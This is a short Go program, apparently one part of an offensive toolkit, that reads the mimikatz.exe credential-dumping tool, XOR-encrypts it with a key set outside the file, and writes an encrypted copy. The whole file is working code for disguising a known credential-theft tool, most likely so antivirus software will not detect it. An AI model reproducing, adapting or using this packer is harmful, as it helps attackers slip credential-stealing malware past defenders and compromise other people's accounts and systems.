// +build pack

package main

import (
	"flag"
	"io/ioutil"
	"log"
	"path/filepath"
)

var key string

func encrypt(data []byte) (ret []byte) {
	encryptionKey := []byte(key)
	keyLen := len(encryptionKey)
	ret = make([]byte, len(data))
	for i := 0; i < len(data); i++ {
		ret[i] = data[i] ^ encryptionKey[i%keyLen]
	}
	return
}

func main() {
	mimiKatzPathPtr := flag.String("m", "mimikatz.exe", "path to the mimikatz.exe")
	mimiKatzOutPtr := flag.String("o", "mimikatz.exe.enc", "output path")
	flag.Parse()
	mimiAbs, err := filepath.Abs(*mimiKatzPathPtr)
	if err != nil {
		log.Fatal(err)
	}
	data, err := ioutil.ReadFile(mimiAbs)
	if err != nil {
		log.Fatal(err)
	}
	err = ioutil.WriteFile(*mimiKatzOutPtr, encrypt(data), 0644)
	if err != nil {
		log.Fatal(err)
	}
}
